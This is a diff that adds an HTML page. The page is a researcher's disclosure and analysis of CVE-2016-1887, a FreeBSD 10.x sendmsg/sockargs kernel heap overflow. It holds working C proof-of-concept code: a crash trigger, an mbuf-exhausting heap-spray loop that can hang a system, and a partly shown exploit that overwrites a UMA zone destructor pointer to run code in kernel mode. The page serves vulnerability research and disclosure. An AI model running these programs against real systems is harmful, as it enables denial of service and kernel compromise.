@@ -1,0 +1,1227 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<title>Analysis of CVE-2016-1887, sendmsg FreeBSD kernel heap overflow</title>
+	</head>
+	
+	<body>
+		<div class="page">
+			<div class="container">
+				<div class="header">
+					<a href="contact.html" class="header-element">
+						Contact
+					</a>
+					
+					<a href="about.html" class="header-element">
+						About
+					</a>
+					
+					<a href="articles.html" class="header-element">
+						Articles
+					</a>
+					
+					<a href="index.html" class="header-element">
+						Home
+					</a>
+				</div>
+				
+				<h1>Analysis of CVE-2016-1887, <code>sendmsg</code> FreeBSD kernel heap overflow</h1>
+				<hr>
+
+				<h2>Introduction</h2>
+				<p>
+					A kernel heap overflow was introduced to FreeBSD in release 10.0, which may be triggered by an unprivileged user under a default installation. The vulnerability doesn't require any additional kernel modules running or any configuration changes, and isn't specific to any architecture.
+				</p>
+				
+				<p>
+					I reported this bug to the <a href="https://www.freebsd.org/security/reporting.html">FreeBSD Security Team</a> on April 27, 2016, and it was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1887">CVE-2016-1887</a> and <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:19.sendmsg.asc">Security Advisory 16:19</a>.
+				</p>
+				
+				<p>
+					In this article I will aim to provide an explanation of the bug, and demonstrate its impact by using it to gain arbitrary kernel code execution as an unprivileged user. As always, since my interest is just in finding and analysing bugs, and not in publishing any fully weaponised exploit source code, I will leave any further development after this point, such as privilege escalation and cleanly restoring the corruption, as an exercise for the reader.
+				</p>
+				
+				<p>
+					All details and code excerpts have been taken from FreeBSD 10.2-RELEASE (amd64) as it was the latest version when this was written. However, little of the relevant code seems to have changed since this release, other than the <code>m_get2</code> function being moved from <code>sys/kern/uipc_mbuf.c</code> into <code>sys/kern/kern_mbuf.c</code> since <a href="https://github.com/freebsd/freebsd/commit/f0d593add5772ff648ff7be3f70bc49c7e69386f">this commit</a>.
+				</p>
+				
+				<br>
+
+				<h2>The bug</h2>
+				<p>
+					Since <a href="https://github.com/freebsd/freebsd/commit/4d24ab3136bd066fd4c31400aa74b0bbc7e5d664">this commit from 2013</a>, the <code>sockargs</code> function no longer performs a bound check on its size argument to catch negative values.
+				</p>
+
+				<p>
+					Before the faulty commit, <code>sockargs</code> would cast <code>buflen</code> to <code>u_int</code> for its bound checks so that a value which was negative as a signed integer would be handled as a large positive value after casting, and would result in <code>EINVAL</code> being returned.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/89cbb92630b48fdd00ee0d5773899bcfa0726a5a/sys/kern/uipc_syscalls.c#L1694">sys/kern/uipc_syscalls.c</a></code>:
+				</p>
+				
+				<pre><code>int
+sockargs(mp, buf, buflen, type)
+	struct mbuf **mp;
+	caddr_t buf;
+	int buflen, type;
+{
+	struct sockaddr *sa;
+	struct mbuf *m;
+	int error;
+
+	if ((u_int)buflen > MLEN) {
+#ifdef COMPAT_OLDSOCK
+		if (type == MT_SONAME &amp;&amp; (u_int)buflen &lt;= 112)
+			buflen = MLEN;		/* unix domain compat. hack */
+		else
+#endif
+			if ((u_int)buflen > MCLBYTES)
+				return (EINVAL);
+	}
+	
+	...
+}</code></pre>
+
+				<br>
+
+				<p>
+					After the commit, <code>sockargs</code> will accept negative values for <code>buflen</code> since the <code>(buflen > MLEN)</code> check will no longer catch them.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_syscalls.c#L1780">sys/kern/uipc_syscalls.c</a></code>:
+				</p>
+
+				<pre><code>int
+sockargs(mp, buf, buflen, type)
+	struct mbuf **mp;
+	caddr_t buf;
+	int buflen, type;
+{
+	struct sockaddr *sa;
+	struct mbuf *m;
+	int error;
+
+	if (buflen > MLEN) {
+#ifdef COMPAT_OLDSOCK
+		if (type == MT_SONAME &amp;&amp; buflen &lt;= 112)
+			buflen = MLEN;		/* unix domain compat. hack */
+		else
+#endif
+			if (buflen > MCLBYTES)
+				return (EINVAL);
+	}
+	
+	...
+}</code></pre>
+
+				<br>
+				
+				<h2>The patch</h2>
+				<p>
+					The issue was solved by adding an explicit check in <code>sockargs</code> to return <code>EINVAL</code> for negative lengths. The official patch may be downloaded from the <a href="https://security.FreeBSD.org/patches/SA-16:19/sendmsg.patch">FreeBSD site</a>.
+				</p>
+				
+				<br>
+				
+				<h2>The heap overflow</h2>
+				<p>
+					Once <code>sockargs</code> has passed the bound checks for <code>buflen</code>, it will perform a zone allocation through <code>m_get2</code>, and then attempt to <code>copyin</code> to this buffer.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_syscalls.c#L1780">sys/kern/uipc_syscalls.c</a></code>:
+				</p>
+
+				<pre><code>int
+sockargs(mp, buf, buflen, type)
+	struct mbuf **mp;
+	caddr_t buf;
+	int buflen, type;
+{
+	struct sockaddr *sa;
+	struct mbuf *m;
+	int error;
+
+	...
+
+	m = m_get2(buflen, M_WAITOK, type, 0);
+	m->m_len = buflen;
+	error = copyin(buf, mtod(m, caddr_t), (u_int)buflen);
+	if (error != 0)
+		(void) m_free(m);
+
+	...
+
+	return (error);
+}</code></pre>
+
+				<br>
+
+				<p>
+					For negative values of <code>size</code>, the <code>m_get2</code> function will always perform a <code>256</code> byte zone allocation on <code>zone_mbuf</code> (created in <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/kern_mbuf.c#L295">mbuf_init</a></code>).
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_mbuf.c#L98">sys/kern/uipc_mbuf.c</a></code>:
+				</p>
+
+				<pre><code>struct mbuf *
+m_get2(int size, int how, short type, int flags)
+{
+	struct mb_args args;
+	struct mbuf *m, *n;
+
+	args.flags = flags;
+	args.type = type;
+
+	if (size &lt;= MHLEN || (size &lt;= MLEN &amp;&amp; (flags &amp; M_PKTHDR) == 0))
+		return (uma_zalloc_arg(zone_mbuf, &amp;args, how));
+	...
+}</code></pre>
+
+				<br>
+
+				<p>
+					The size will then be casted to <code>u_int</code>, so a negative length such as <code>-1</code> will wrap around to <code>0xffffffff</code>, before being passed to <code>copyin</code>.
+				</p>
+
+				<p>
+					To summarise the above: by calling <code>sockargs</code> with a <code>buflen</code> of <code>-1</code>, a zone allocation of <code>256</code> bytes will be returned by <code>m_get2</code>, which will then be copied into from userland memory with a size of <code>0xffffffff</code> bytes.
+				</p>
+
+				<br>
+
+				<h2>Triggering</h2>
+				<p>
+					To reach <code>sockargs</code> with a user controlled <code>buflen</code> we use the <code>sendmsg</code> system call to go through <code>sys_sendmsg -> sendit -> sockargs</code>, with the desired buffer and length in the <code>msg_control</code> and <code>msg_controllen</code> members of <code>struct msghdr</code>.
+				</p>
+
+				<p>
+					We can use the <code>sendmsg</code> system call on a freshly created socket without any requirement to alter its state.
+				</p>
+
+				<div class="quote">
+					The <code>send()</code> function may be used only when the socket is in a <i>connected</i> state, while <code>sendto()</code> and <code>sendmsg()</code> may be used at any time.
+				</div>
+
+				<div class="quote-reference">
+					- <a href="https://www.freebsd.org/cgi/man.cgi?query=send&amp;apropos=0&amp;sektion=2&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html">FreeBSD Man Page</a>
+				</div>
+				<br>
+
+				<br>
+
+				<p>
+					Once we call <code>sys_sendmsg</code>, a userland <code>struct msghdr</code> will be copied into <code>msg</code>, and its address passed onto <code>sendit</code>.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_syscalls.c#L1050">sys/kern/uipc_syscalls.c</a></code>:
+				</p>
+
+				<pre><code>int
+sys_sendmsg(td, uap)
+	struct thread *td;
+	struct sendmsg_args /* {
+		int	s;
+		caddr_t	msg;
+		int	flags;
+	} */ *uap;
+{
+	struct msghdr msg;
+	struct iovec *iov;
+	int error;
+
+	error = copyin(uap->msg, &amp;msg, sizeof (msg));
+	if (error != 0)
+		return (error);
+	error = copyiniov(msg.msg_iov, msg.msg_iovlen, &amp;iov, EMSGSIZE);
+	if (error != 0)
+		return (error);
+	msg.msg_iov = iov;
+#ifdef COMPAT_OLDSOCK
+	msg.msg_flags = 0;
+#endif
+	error = sendit(td, uap->s, &amp;msg, uap->flags);
+	free(iov, M_IOV);
+	return (error);
+}</code></pre>
+
+				<br>
+
+				<p>
+					In <code>sendit</code>, if the <code>struct msghdr</code> has a non-<code>NULL</code> <code>msg_control</code> it will perform a bound check on the <code>msg_controllen</code> member, and then call <code>sockargs</code>. An unsigned comparison will be performed here because <code>msg_control</code> has an unsigned type (<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/socket.h#L402">socklen_t</a></code>) and is compared against the <code>sizeof</code> operator (which has type <code>size_t</code>), meaning that this bound check won't catch negative values either.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_syscalls.c#L816">sys/kern/uipc_syscalls.c</a></code>:
+				</p>
+
+				<pre><code>static int
+sendit(td, s, mp, flags)
+	struct thread *td;
+	int s;
+	struct msghdr *mp;
+	int flags;
+{
+	struct mbuf *control;
+	struct sockaddr *to;
+	int error;
+
+	...
+
+	if (mp->msg_control) {
+		if (mp->msg_controllen &lt; sizeof(struct cmsghdr)
+#ifdef COMPAT_OLDSOCK
+		    &amp;&amp; mp->msg_flags != MSG_COMPAT
+#endif
+		) {
+			error = EINVAL;
+			goto bad;
+		}
+		error = sockargs(&amp;control, mp->msg_control,
+		    mp->msg_controllen, MT_CONTROL);
+
+		...
+
+		return (error);
+}</code></pre>
+
+				<br>
+				
+				<p>
+					<code>sockargs</code> has now been called with a negative length, which will trigger the vulnerability.
+				</p>
+				
+				<br>
+				
+				<h2>PoC</h2>
+				<p>
+					The following PoC code should panic vulnerable versions of FreeBSD by overflowing a <code>256</code> byte allocation on <code>zone_mbuf</code> with <code>0x4000</code> bytes of <code>'a'</code>.
+				</p>
+
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/socket.h&gt;
+
+#define BUFFER_SIZE 256
+#define OVERFLOW_SIZE 0x4000
+
+int main(void) {
+	int sock;
+	struct msghdr msg;
+	
+	char *mapping, *buffer, *overflow;
+	const size_t copySize = BUFFER_SIZE + OVERFLOW_SIZE;
+	const size_t mappingSize = (copySize + PAGE_SIZE - 1) &amp; ~(PAGE_SIZE - 1);
+	
+	mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	munmap(mapping + mappingSize, PAGE_SIZE);
+	
+	buffer = mapping + mappingSize - copySize;
+	overflow = buffer + BUFFER_SIZE;
+	
+	memset(overflow, 'a', OVERFLOW_SIZE);
+	
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	
+	memset(&amp;msg, 0, sizeof(msg));
+	msg.msg_control = buffer;
+	msg.msg_controllen = -1;
+	
+	sendmsg(sock, &amp;msg, 0);
+	
+	munmap(mapping, mappingSize);
+	close(sock);
+	
+	return 0;
+}
+</code></pre>
+				
+				<p>
+					<i>Before running binaries which you expect to panic your system, it is a good idea is to set the <code>sysctl</code> variable <code>kern.sync_on_panic</code> to a non-<code>0</code> value to prevent data loss.</i>
+				</p>
+				
+				<br>
+
+				<h2>Controlling the overflow size</h2>
+				<p>
+					Although the size passed to <code>copyin</code> will be <code>0xffffffff</code>, we can reduce the size of the copy by using the same technique as described in my <a href="dlclose-overflow.html#control">analysis of <code>sys_dynlib_prepare_dlclose</code> PS4 kernel heap overflow</a> to cancel the call after copying a certain amount of bytes.
+				</p>
+
+				<p>
+					Essentially, by mapping the size of the copy we want plus one additional page, and then unmapping additional page, we can ensure that after <code>copyin</code> has copied all of the memory we desire, it will attempt to read from the unmapped userland memory following it, which will trigger a page fault, causing it to return <code>EFAULT</code>.
+				</p>
+
+				<br>
+
+				<h2>Heap manipulation</h2>
+				<p>
+					By setting up a host <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix domain socket</a> and connecting a client, we can perform <code>3</code> allocations on <code>zone_mbuf</code> each time a file descriptor is transferred via <code>sendmsg</code>.
+				</p>
+
+				<p>
+					This can be used to manipulate the heap, to control where the <code>mbuf</code> used during the vulnerability will begin overflowing from.
+				</p>
+				
+				<p>
+					The below PoC demonstrates this by exhausting the <code>mbuf</code> zone. If left for a few minutes, so that the <code>sysctl</code> limit for <code>kern.ipc.nmbufs</code> is reached, the system will become unresponsive, similar to a <a href="https://en.wikipedia.org/wiki/Fork_bomb">fork bomb</a>.
+				</p>
+
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;sys/un.h&gt;
+
+#define TEMP_FILE "/tmp/mbuf.poc"
+
+#define INFO_SIZE 0
+#define INFO_LIMIT 1
+#define INFO_USED 2
+#define INFO_FREE 3
+#define INFO_REQ 4
+#define INFO_FAIL 5
+
+int getZoneInfo(char *zname, int i) {
+	#define BUF_SIZE 256
+	#define LINE_SIZE 56
+	
+	unsigned int info[6] = { 0 };
+	FILE *fp = NULL;
+	char buf[BUF_SIZE];
+	char iname[LINE_SIZE];
+	
+	fp = popen("/usr/bin/vmstat -z", "r");
+	
+	if(fp == NULL) {
+		perror("popen");
+		exit(1);
+	}
+	
+	memset(buf, 0, sizeof(buf));
+	memset(iname, 0, sizeof(iname));
+	
+	while(fgets(buf, sizeof(buf) - 1, fp) != NULL) {
+		sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &amp;info[INFO_SIZE], &amp;info[INFO_LIMIT],
+			&amp;info[INFO_USED], &amp;info[INFO_FREE], &amp;info[INFO_REQ], &amp;info[INFO_FAIL]);
+		
+		if(strncmp(iname, zname, strlen(zname)) == 0 &amp;&amp; iname[strlen(zname)] == ':') {
+			break;
+		}
+	}
+	
+	pclose(fp);
+	return info[i];
+}
+
+int setupHost(struct sockaddr_un *address) {
+	int host = socket(AF_UNIX, SOCK_DGRAM, 0);
+	
+	if(host < 0) {
+		perror("[-] socket");
+		exit(1);
+	}
+	
+	if(bind(host, (struct sockaddr *)address, sizeof(*address)) == -1) {
+		perror("[-] bind");
+		exit(1);
+	}
+	
+	return host;
+}
+
+int setupClient(struct sockaddr_un *address) {
+	int client = socket(AF_UNIX, SOCK_DGRAM, 0);
+	
+	if(client < 0) {
+		perror("[-] socket");
+		exit(1);
+	}
+	
+	if(connect(client, (struct sockaddr *)address, sizeof(*address)) == -1) {
+		perror("[-] connect");
+		exit(1);
+	}
+	
+	return client;
+}
+
+int main(void) {
+	unlink(TEMP_FILE);
+	
+	struct sockaddr_un cl;
+	memset(&amp;cl, 0, sizeof(cl));
+	cl.sun_family = AF_UNIX;
+	strncpy(cl.sun_path, TEMP_FILE, 104);
+	
+	int host = setupHost(&amp;cl);
+	int client = setupClient(&amp;cl);
+	
+	struct msghdr msg = {};
+	char buff[CMSG_SPACE(sizeof(int))] = { 0 };
+	bzero(buff, sizeof(buff));
+	msg.msg_control = buff;
+	msg.msg_controllen = sizeof(buff);
+	
+	struct cmsghdr *cmsg;
+	cmsg = CMSG_FIRSTHDR(&amp;msg);
+	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
+	cmsg->cmsg_level = SOL_SOCKET;
+	cmsg->cmsg_type = SCM_RIGHTS;
+	
+	int transfer = open(".", O_RDONLY | O_DIRECTORY);
+	
+	if(transfer < 0) {
+		perror("[-] open");
+		exit(1);
+	}
+	
+	memcpy((int *)CMSG_DATA(cmsg), &amp;transfer, sizeof(int));
+	
+	int u, f;
+	while(1) {
+		u = getZoneInfo("mbuf", INFO_USED);
+		f = getZoneInfo("mbuf", INFO_FREE);
+		printf("  [+] Used %d, free %d\n", u, f);
+		
+		ssize_t nsent = sendmsg(client, &amp;msg, 0);
+		
+		if(nsent < 0) {
+			if(errno == ENOBUFS) {
+				printf("  [+] Using new sockets after %d allocations\n", u);
+				unlink(TEMP_FILE);
+				
+				host = setupHost(&amp;cl);
+				
+				close(client);
+				client = setupClient(&amp;cl);
+			}
+			else {
+				perror("[-] sendmsg");
+				exit(1);
+			}
+		}
+		
+		if(getZoneInfo("mbuf", INFO_FREE) > f) {
+			printf("  [+] Zone mbuf expanded\n");
+		}
+	}
+	
+	return 0;
+}</code></pre>
+				
+				<p>
+					<i><code>getZoneInfo</code> function based on code originally written by <a href="http://phrack.org/issues/66/8.html">argp</a>.</i>
+				</p>
+				
+				<p>
+					Note that due to heap fragmentation, the <code>m_get2</code> function won't necessarily return a predictable pattern of addresses, and that these addresses won't be consistent across reboots.
+				</p>
+				
+				<p>
+					An example of the pattern of addresses returned to <code>sockargs</code> by <code>m_get2</code>:
+				</p>
+				
+				<pre><code>0xfffff8000291ba00
+0xfffff8000291bc00
+0xfffff8000291c200
+0xfffff8000291c500
+0xfffff8000291c700
+0xfffff8000291d100
+0xfffff8000291d500
+0xfffff8000291db00
+0xfffff8000291cd00
+0xfffff8000291cc00
+0xfffff8000291c800
+...</code></pre>
+				
+				<br>
+				
+				<h2>Dumping overflow memory</h2>
+				<p>
+					We can dump the memory before it has been overflown into as a guide us which structures should be crafted for the overflow, and to help identify suitible targets for gaining <code>rip</code> control.
+				</p>
+				
+				<p>
+					To do this, put a breakpoint on the call to <code>copyin</code> when our overflow length is supplied:
+				</p>
+
+				<pre><code>(gdb) break *0xffffffff809c7aee
+(gdb) cond 1 $rdx==0xffffffff</code></pre>
+
+				<br>
+
+				<p>
+					From here we can dump the region which is being copied into:
+				</p>
+
+				<pre><code>dump binary memory dump.bin ($rsi) ($rsi+0x5000)</code></pre>
+
+				<br>
+
+				<p>
+					<i>I dumped from the start of the buffer, not from the overflow. You should discard the first 256 bytes of the dump if you only want to see the memory which will be overflown into.</i>
+				</p>
+
+				<br>
+				
+				<h2>Targets to overflow into</h2>
+				<p>
+					The direct memory overflown into is the next <code>struct mbuf</code> on the heap which follows the allocation given to <code>sockargs</code>.
+				</p>
+
+				<p>
+					<code><a href-"https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/mbuf.h#L185">sys/sys/mbuf.h</a></code>:
+				</p>
+
+				<pre><code>struct mbuf {
+	struct m_hdr	m_hdr;
+	union {
+		struct {
+			struct pkthdr	MH_pkthdr;	/* M_PKTHDR set */
+			union {
+				struct m_ext	MH_ext;	/* M_EXT set */
+				char		MH_databuf[MHLEN];
+			} MH_dat;
+		} MH;
+		char	M_databuf[MLEN];		/* !M_PKTHDR, !M_EXT */
+	} M_dat;
+};</code></pre>
+
+				<br>
+				
+				<p>
+					The <code><a href="https://www.freebsd.org/cgi/man.cgi?query=mbuf&amp;apropos=0&amp;sektion=9&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html">mbuf</a></code> interface is widely used throughout the FreeBSD kernel networking stack, to store packets and socket buffers for example.
+				</p>
+				
+				<p>
+					Depending on a few factors such as how many allocations have already been performed on the <code>mbuf</code> zone, and the size and contents of the overflow, we can get the system to panic at various <code>mbuf</code> related code paths.
+				</p>
+				
+				<br>
+
+				<h3><code>unp_gc</code></h3>
+				<p>
+					The first place I analysed was when the system crashed at address <code>0xFFFFFFFF809CECD0</code>, which is a comparison instruction with a controlled address in <code>r11</code>:
+				</p>
+
+				<pre><code>FFFFFFFF809CECD0 cmp     byte ptr [r11+1Ch], 0Eh</code></pre>
+
+				<br>
+
+				<p>
+					This occurs in <code>unp_gc_process</code> with <code>unp</code> containing the controlled address, which is inlined into the <code>unp_gc</code> function in the compiled kernel.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_usrreq.c#L2216">sys/kern/uipc_usrreq.c</a></code>:
+				</p>
+
+				<pre><code>static void
+unp_gc(__unused void *arg, int pending)
+{
+	struct unp_head *heads[] = { &amp;unp_dhead, &amp;unp_shead, &amp;unp_sphead,
+				    NULL };
+	struct unp_head **head;
+	struct file *f, **unref;
+	struct unpcb *unp;
+	int i, total;
+
+	unp_taskcount++;
+	UNP_LIST_LOCK();
+	/*
+	 * First clear all gc flags from previous runs, apart from
+	 * UNPGC_IGNORE_RIGHTS.
+	 */
+	for (head = heads; *head != NULL; head++)
+		LIST_FOREACH(unp, *head, unp_link)
+			unp->unp_gcflag =
+			    (unp->unp_gcflag &amp; UNPGC_IGNORE_RIGHTS);
+
+	/*
+	 * Scan marking all reachable sockets with UNPGC_REF.  Once a socket
+	 * is reachable all of the sockets it references are reachable.
+	 * Stop the scan once we do a complete loop without discovering
+	 * a new reachable socket.
+	 */
+	do {
+		unp_unreachable = 0;
+		unp_marked = 0;
+		for (head = heads; *head != NULL; head++)
+			LIST_FOREACH(unp, *head, unp_link)
+				unp_gc_process(unp);
+	} while (unp_marked);
+	
+	...
+
+static void
+unp_gc_process(struct unpcb *unp)
+{
+	struct socket *soa;
+	struct socket *so;
+	struct file *fp;
+
+	/* Already processed. */
+	if (unp->unp_gcflag &amp; UNPGC_SCANNED)
+		return;
+	fp = unp->unp_file;
+
+	/*
+	 * Check for a socket potentially in a cycle.  It must be in a
+	 * queue as indicated by msgcount, and this must equal the file
+	 * reference count.  Note that when msgcount is 0 the file is NULL.
+	 */
+	if ((unp->unp_gcflag &amp; UNPGC_REF) == 0 &amp;&amp; fp &amp;&amp;
+	    unp->unp_msgcount != 0 &amp;&amp; fp->f_count == unp->unp_msgcount) {
+		unp->unp_gcflag |= UNPGC_DEAD;
+		unp_unreachable++;
+		return;
+	}
+	
+	...</code></pre>
+
+				<br>
+
+				<p>
+					The only write we can control is the bitwise <code>OR</code> on <code>unp->unp_gcflag</code>:
+				</p>
+
+				<pre><code>unp->unp_gcflag |= UNPGC_DEAD;</code></pre>
+				
+				<br>
+				
+				<p>
+					The decompiled code from this, where <code>x</code> is a pointer to a 16 bit type:
+				</p>
+
+				<pre><code>*x = *x &amp; 0xFFFC | 1;</code></pre>
+
+				<br>
+
+				<p>
+					The effect of this on the upper 2 bytes of a kernel address would be from <code>0xffff -> 0xfffd</code>, so a full kernel address could convert from <code>0xffffffff80000000 -> 0xfffdffff80000000</code>. If we point the address <code>1</code> byte lower, we can get from <code>0xffffffff80000000 -> 0xfdffffff80000000</code> instead. However, neither of these corrupted addresses are mappable from userland, so this isn't particularly interesting for us.
+				</p>
+
+				<br>
+
+				<h3><code>unp_dispose</code></h3>
+				<p>
+					The next panic analysed occurred at address <code>0xFFFFFFFF809CB300</code>, which resides in the <code>unp_dispose</code> function.
+				</p>
+
+				<p>
+					<a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/uipc_usrreq.c#L2303"><code>sys/kern/uipc_usrreq.c</code></a>:
+				</p>
+
+				<pre><code>static void
+unp_dispose(struct mbuf *m)
+{
+
+	if (m)
+		unp_scan(m, unp_freerights);
+}
+
+static void
+unp_scan(struct mbuf *m0, void (*op)(struct filedescent **, int))
+{
+	struct mbuf *m;
+	struct cmsghdr *cm;
+	void *data;
+	socklen_t clen, datalen;
+
+	while (m0 != NULL) {
+		for (m = m0; m; m = m->m_next) {
+			...
+			(*op)(data, datalen /
+			    sizeof(struct filedescent *));
+			...
+		}
+		m0 = m0->m_nextpkt;
+	}
+}
+
+static void
+unp_freerights(struct filedescent **fdep, int fdcount)
+{
+	struct file *fp;
+	int i;
+
+	KASSERT(fdcount > 0, ("%s: fdcount %d", __func__, fdcount));
+
+	for (i = 0; i &lt; fdcount; i++) {
+		fp = fdep[i]->fde_file;
+		filecaps_free(&amp;fdep[i]->fde_caps);
+		unp_discard(fp);
+	}
+	free(fdep[0], M_FILECAPS);
+}</code></pre>
+
+				<br>
+
+				<p>
+					<a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/kern_descrip.c#L1484"><code>sys/kern/kern_descrip.c</code></a>:
+				</p>
+
+				<pre><code>void
+filecaps_free(struct filecaps *fcaps)
+{
+
+	free(fcaps->fc_ioctls, M_FILECAPS);
+	bzero(fcaps, sizeof(*fcaps));
+}</code></pre>
+
+				<br>
+
+				<p>
+					There is much more potential here. If we could leak the address of a kernel object containing function pointers, like a <code>kqueue</code>, we could cause use after free on it, which would lead to <code>rip</code> control.
+				</p>
+				
+				<br>
+
+				<h3><code>uma_zfree_arg</code></h3>
+				<p>
+					I decided to try increasing the copy size past all other <code>mbuf</code> allocations, and discovered that by doing so we will eventually corrupt UMA metadata, which turns out to be the most easily exploitable code path.
+				</p>
+
+				<p>
+					After performing the overflow and freeing a kernel allocation which relies on the corrupted data (by closing a socket for example), the system will panic at <code>0xFFFFFFFF80BBF2CC</code> in <code>uma_zfree_arg</code>, which is a <code>call</code> instruction with a user controlled address:
+				</p>
+
+				<pre><code>FFFFFFFF80BBF2CC                 call    rax</code></pre>
+
+				<br>
+
+				<p>
+					The function pointer called is the <code>uz_dtor</code> member of a <code>uma_zone_t</code> (a <code>typedef</code> for <code>struct uma_zone</code>):
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/vm/uma_core.c#L2659">sys/vm/uma_core.c</a></code>:
+				</p>
+
+				<pre><code>void
+uma_zfree_arg(uma_zone_t zone, void *item, void *udata)
+{
+	uma_cache_t cache;
+	uma_bucket_t bucket;
+	int lockfail;
+	int cpu;
+
+	...
+
+	if (item == NULL)
+		return;
+
+	...
+
+	if (zone->uz_dtor != NULL)
+		zone->uz_dtor(item, zone->uz_size, udata);
+	
+	...
+}</code></pre>
+
+				<br>
+				
+				<p>
+					Hijacking this function pointer was the method I used in my initial announcement of this research:
+				</p>
+
+				<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Kernel exploit for FreeBSD-10.2-RELEASE is happening! </p><img src="images/FreeBSD/sockargs.png" /><br>&mdash; CTurt (@CTurtE) <a href="https://twitter.com/CTurtE/status/712054014742024193">March 21, 2016</a></blockquote>
+				<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+				<p>
+					Since FreeBSD still has no support for SMAP or SMEP (although it is a planned feature of HardenedBSD), once <code>rip</code> control has been achieved, we can execute arbitrary userland code in kernel mode!
+				</p>
+				
+				<p>
+					The below code demonstrates achieving arbitrary kernel code execution from the bug by spraying corrupted zones past the <code>mbuf</code> allocations.
+				</p>
+				
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/linker.h&gt;
+
+void (*critical_enter)(void);
+int (*kprintf)(const char *fmt, ...);
+
+void *resolve(char *name) {
+	struct kld_sym_lookup ksym;
+	
+	ksym.version = sizeof(ksym);
+	ksym.symname = name;
+	
+	if(kldsym(0, KLDSYM_LOOKUP, &amp;ksym) < 0) {
+		perror("kldsym");
+		exit(1);
+	}
+	
+	printf("  [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
+	return (void *)ksym.symvalue;
+}
+
+void payload(void) {
+	critical_enter();
+	kprintf("  [+] Entered kernel payload\n");
+	while(1);
+}
+
+#define INFO_SIZE 0
+#define INFO_LIMIT 1
+#define INFO_USED 2
+#define INFO_FREE 3
+#define INFO_REQ 4
+#define INFO_FAIL 5
+
+int getZoneInfo(char *zname, int i) {
+	#define BUF_SIZE 256
+	#define LINE_SIZE 56
+	
+	unsigned int info[6] = { 0 };
+	FILE *fp = NULL;
+	char buf[BUF_SIZE];
+	char iname[LINE_SIZE];
+	
+	fp = popen("/usr/bin/vmstat -z", "r");
+	
+	if(fp == NULL) {
+		perror("popen");
+		exit(1);
+	}
+	
+	memset(buf, 0, sizeof(buf));
+	memset(iname, 0, sizeof(iname));
+	
+	while(fgets(buf, sizeof(buf) - 1, fp) != NULL) {
+		sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &amp;info[INFO_SIZE], &amp;info[INFO_LIMIT],
+			&amp;info[INFO_USED], &amp;info[INFO_FREE], &amp;info[INFO_REQ], &amp;info[INFO_FAIL]);
+		
+		if(strncmp(iname, zname, strlen(zname)) == 0 &amp;&amp; iname[strlen(zname)] == ':') {
+			break;
+		}
+	}
+	
+	pclose(fp);
+	return info[i];
+}
+
+void craftZone(void *zone) {
+	void **uz_slab = (void **)(zone + 200);
+	void **uz_dtor = (void **)(zone + 216);
+	void **uz_fini = (void **)(zone + 232);
+	void **uz_import = (void **)(zone + 240);
+	void **uz_release = (void **)(zone + 248);
+	*uz_dtor = payload;
+}
+
+int main(void) {
+	int sock;
+	struct msghdr msg;
+	
+	critical_enter = resolve("critical_enter");
+	kprintf = resolve("printf");
+	
+	const int previousAllocations = getZoneInfo("mbuf", INFO_USED);
+	
+	const size_t bufferSize = getZoneInfo("mbuf", INFO_SIZE);
+	const size_t overflowSize = previousAllocations * bufferSize + 0x4000;
+	
